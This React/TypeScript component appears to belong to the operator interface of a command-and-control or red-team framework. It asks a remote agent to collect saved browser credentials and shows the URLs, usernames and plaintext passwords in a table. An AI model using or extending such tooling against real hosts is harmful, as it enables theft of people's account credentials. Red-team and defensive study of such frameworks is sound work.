"use client";
import React, { useEffect, useState } from "react";
import { Agent } from "@/lib/types";
import useTaskRunner from "@/lib/hooks/useTaskRunner";
import Loading from "@/components/Loading";
import useAxiosAuth from "@/lib/hooks/useAxiosAuth";

// Data structures
interface CredentialRecord {
    url: string;
    created: string;
    last_used: string;
    username: string;
    password: string | null;
}
interface BrowserProfile {
    profile: string;
    credentials: CredentialRecord[];
}
interface BrowserInfo {
    browser: string;
    profiles: BrowserProfile[];
}

interface WebCredentialResponse {
    browsers: BrowserInfo[];
}

interface WebCredentialsPanelProps {
    agent: Agent;
}

/**
 * Renders a "Web Credentials" panel:
 * - A dropdown to select browser
 * - A dropdown to select profile
 * - A table of credentials
 */
export default function WebCredentialsPanel({ agent }: WebCredentialsPanelProps) {
    const [data, setData] = useState<BrowserInfo[] | null>(null);
    const [loading, setLoading] = useState<boolean>(false);
    const [error, setError] = useState<string | null>(null);

    // States for selection
    const [selectedBrowser, setSelectedBrowser] = useState<string>("");
    const [selectedProfile, setSelectedProfile] = useState<string>("");


    const { getTaskResults } = useTaskRunner();
    const axiosAuth = useAxiosAuth()

    useEffect(() => {
        fetchWebCredentials();
    }, [agent.AgentId]);

    // 1) Fetch data from server
    async function fetchWebCredentials() {
        try {
            setLoading(true);
            setError(null);

            const response = await axiosAuth.post<any>(`/agents/${agent.AgentId}/modules/collection/passwords/collect_web_credentials`, {
                cred_type: 0
            })
            const resp: WebCredentialResponse = await getTaskResults(response.data.task_id);

            if (!resp?.browsers) {
                setData([]);
                setSelectedBrowser("");
                setSelectedProfile("");
            } else {
                setData(resp.browsers);
                // Auto-select first browser & first profile if they exist
                if (resp.browsers.length > 0) {
                    const defaultBrowser = resp.browsers[0].browser;
                    setSelectedBrowser(defaultBrowser);

                    if (resp.browsers[0].profiles.length > 0) {
                        setSelectedProfile(resp.browsers[0].profiles[0].profile);
                    } else {
                        setSelectedProfile("");
                    }
                } else {
                    setSelectedBrowser("");
                    setSelectedProfile("");
                }
            }

            setLoading(false);
        } catch (err) {
            console.error("Failed to fetch web credentials:", err);
            setError("Error loading browser credentials.");
            setData(null);
            setLoading(false);
        }
    }

    function handleBrowserChange(e: React.ChangeEvent<HTMLSelectElement>) {
        const newBrowser = e.target.value;
        setSelectedBrowser(newBrowser);

        // If user picks a new browser, auto-select that browser's first profile if any
        if (data) {
            const foundBrowser = data.find((b) => b.browser === newBrowser);
            if (foundBrowser && foundBrowser.profiles.length > 0) {
                setSelectedProfile(foundBrowser.profiles[0].profile);
            } else {
                setSelectedProfile("");
            }
        }
    }

    function handleProfileChange(e: React.ChangeEvent<HTMLSelectElement>) {
        setSelectedProfile(e.target.value);
    }

    // Which credentials do we display?
    function getCurrentCredentials(): CredentialRecord[] {
        if (!data || !selectedBrowser) return [];
        const browserObj = data.find((b) => b.browser === selectedBrowser);
        if (!browserObj) return [];

        // If no profile selected, we can't show anything
        if (!selectedProfile) return [];

        const profObj = browserObj.profiles.find((p) => p.profile === selectedProfile);
        if (!profObj) return [];
        return profObj.credentials;
    }

    function handleRefresh() {
        fetchWebCredentials();
    }

    if (loading) {
        return (
            <Loading text={"Loading Web Credentials..."}></Loading>
        );
    }

    if (error) {
        return <div className="text-danger">{error}</div>;
    }

    if (!data || data.length === 0) {
        return (
            <div className="card bg-dark text-white" style={{ borderRadius: 16 }}>
                <div className="card-body">
                    No browser credentials found.
                </div>
            </div>
        );
    }

    // Build the list of profiles for the current selected browser
    let profileNames: string[] = [];
    if (selectedBrowser) {
        const found = data.find((b) => b.browser === selectedBrowser);
        if (found) {
            profileNames = found.profiles.map((p) => p.profile);
        }
    }

    const credentials = getCurrentCredentials();

    return (
        <div className="card bg-dark text-white web-cred-panel" style={{ borderRadius: 16 }}>
            <div className="card-header d-flex justify-content-between align-items-center">
                <h5 className="mb-0" style={{ fontFamily: "Orbitron, sans-serif" }}>
                    Web Credentials
                </h5>
                <button className="btn btn-sm btn-secondary d-flex align-items-center" onClick={handleRefresh}>
                    <i className="bi bi-arrow-clockwise me-1" />
                    Refresh
                </button>
            </div>

            <div className="card-body">
                {/* Browser & Profile selectors */}
                <div className="row g-2 mb-3">
                    {/* Browser selector */}
                    <div className="col-sm-auto">
                        <label className="form-label mb-1" style={{ fontSize: "0.9rem" }}>Browser</label>
                        <select
                            className="form-select form-select-sm bg-secondary text-white border-0"
                            value={selectedBrowser}
                            onChange={handleBrowserChange}
                        >
                            {data.map((b) => (
                                <option key={b.browser} value={b.browser}>
                                    {b.browser}
                                </option>
                            ))}
                        </select>
                    </div>

                    {/* Profile selector */}
                    <div className="col-sm-auto">
                        <label className="form-label mb-1" style={{ fontSize: "0.9rem" }}>Profile</label>
                        <select
                            className="form-select form-select-sm bg-secondary text-white border-0"
                            value={selectedProfile}
                            onChange={handleProfileChange}
                            disabled={!selectedBrowser}
                        >
                            {profileNames.length === 0 ? (
                                <option value="">No Profiles</option>
                            ) : profileNames.map((pn) => (
                                <option key={pn} value={pn}>
                                    {pn}
                                </option>
                            ))}
                        </select>
                    </div>
                </div>

                {/* Credentials Table */}
                {!selectedProfile ? (
                    <p className="text-muted">No profile selected.</p>
                ) : credentials.length === 0 ? (
                    <p className="text-muted">No credentials found for this profile.</p>
                ) : (
                    <div className="table-responsive">
                        <table className="table table-dark table-hover table-sm mb-0 credential-table table-fixed">
                            <thead>
                                <tr>
                                    <th>URL</th>
                                    <th>Created</th>
                                    <th>Last Used</th>
                                    <th>Username</th>
                                    <th>Password</th>
                                </tr>
                            </thead>
                            <tbody>
                                {credentials.map((c, idx) => {
                                    return (
                                        <tr key={idx}>
                                            <td>{c.url || "N/A"}</td>
                                            <td>{c.created}</td>
                                            <td>{c.last_used}</td>
                                            <td>{c.username || "N/A"}</td>
                                            <td>{c.password || "None"}</td>
                                        </tr>
                                    );
                                })}
                            </tbody>
                        </table>
                    </div>
                )}
            </div>
        </div>
    );
}